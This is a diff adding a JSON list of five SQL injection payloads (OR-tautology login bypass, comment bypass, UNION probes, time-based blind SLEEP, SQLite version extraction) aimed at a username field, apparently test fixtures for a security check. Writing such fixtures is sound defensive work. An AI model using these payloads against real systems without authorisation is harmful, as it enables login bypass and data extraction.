@@ -1,0 +1,37 @@
+[
+  {
+    "id": "sqli_001",
+    "name": "Classic OR bypass",
+    "payload": "' OR '1'='1",
+    "field": "username",
+    "description": "Bypasses login by making WHERE clause always true"
+  },
+  {
+    "id": "sqli_002",
+    "name": "Comment bypass",
+    "payload": "admin'--",
+    "field": "username",
+    "description": "Terminates SQL query with comment, bypasses password check"
+  },
+  {
+    "id": "sqli_003",
+    "name": "UNION SELECT probe",
+    "payload": "' UNION SELECT 1,2,3--",
+    "field": "username",
+    "description": "Probes for UNION-based SQLi; checks column count"
+  },
+  {
+    "id": "sqli_004",
+    "name": "Time-based blind",
+    "payload": "' OR SLEEP(3)--",
+    "field": "username",
+    "description": "Detects blind SQLi via response time delay"
+  },
+  {
+    "id": "sqli_005",
+    "name": "SQLite version extract",
+    "payload": "' UNION SELECT sqlite_version(),2--",
+    "field": "username",
+    "description": "Extracts SQLite version via UNION injection"
+  }
+]
